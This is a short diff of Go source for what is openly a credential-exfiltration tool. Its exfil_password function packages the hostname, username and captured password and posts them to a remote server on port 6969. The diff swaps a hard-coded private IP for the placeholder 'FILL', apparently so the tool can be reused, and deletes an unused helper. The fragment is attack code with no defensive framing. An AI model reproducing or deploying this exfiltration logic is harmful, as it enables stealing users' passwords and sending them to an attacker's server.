@@ -52,7 +52,7 @@ func exfil_password(username, password string) {
 	if err != nil {
 		return
 	}
-	serverURL := "http://10.159.76.35:6969/"
+	serverURL := "http://FILL:6969/"
 	values := url.Values{}
 	values.Set("hostname", hostname)
 	values.Set("username", username)
@@ -94,13 +94,4 @@ func main() {
 		}
 		time.Sleep(250 * time.Millisecond)
 	}
-}
-
-func contains(slice []int, value int) bool {
-	for _, v := range slice {
-		if v == value {
-			return true
-		}
-	}
-	return false
 }
